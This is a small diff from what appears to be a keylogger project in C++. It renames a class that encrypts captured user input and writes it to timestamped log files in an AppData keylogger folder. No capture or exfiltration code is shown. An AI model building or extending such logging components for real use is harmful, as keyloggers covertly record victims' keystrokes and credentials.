@@ -1,4 +1,4 @@
-#include "UserInputFileLogger.h"
+#include "UserInputEncryptedFileLogger.h"
 
 #include <utility>
 
@@ -9,13 +9,14 @@
 namespace keylogger
 {
 
-UserInputFileLogger::UserInputFileLogger(std::shared_ptr<FileSystemAccess> fileSystemAccessInit,
-                                         std::unique_ptr<Encryptor> encryptorInit)
+UserInputEncryptedFileLogger::UserInputEncryptedFileLogger(
+    std::shared_ptr<FileSystemAccess> fileSystemAccessInit, std::unique_ptr<Encryptor> encryptorInit)
     : fileSystemAccess{std::move(fileSystemAccessInit)}, encryptor{std::move(encryptorInit)}
 {
 }
 
-std::string UserInputFileLogger::writeLogToNewlyCreatedFileBasedOnCurrentTime(const std::string& data)
+std::string
+UserInputEncryptedFileLogger::writeLogToNewlyCreatedFileBasedOnCurrentTime(const std::string& data)
 {
     std::string path = KeyloggerDirectoryLocator::getAppDataKeyloggerPath(true);
     std::string name = TimestampFetcher::getFormattedTimestamp("_") + ".log";
